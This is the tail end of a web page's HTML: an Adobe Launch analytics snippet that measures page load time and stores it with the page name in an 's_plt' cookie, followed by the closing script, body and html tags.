            var pageLoadTime, finalPageName = _satellite.getVar("finalPageName"); if ("undefined" != typeof performance && void 0 !== performance.timing && (void 0 !== performance.timing.loadEventEnd && void 0 !== performance.timing.navigationStart && performance.timing.loadEventEnd >= 0 && performance.timing.navigationStart >= 0 && (pageLoadTime = performance.timing.loadEventEnd - performance.timing.navigationStart < 6e4 && performance.timing.loadEventEnd - performance.timing.navigationStart >= 0 ? parseFloat((performance.timing.loadEventEnd - performance.timing.navigationStart) / 1e3).toFixed(2) : 60, void 0 !== window.cookieWrite && void 0 !== pageLoadTime))) { var s_plt_value = pageLoadTime + "," + finalPageName; window.cookieWrite("s_plt", s_plt_value) }
        });</script>
</body>

</html>
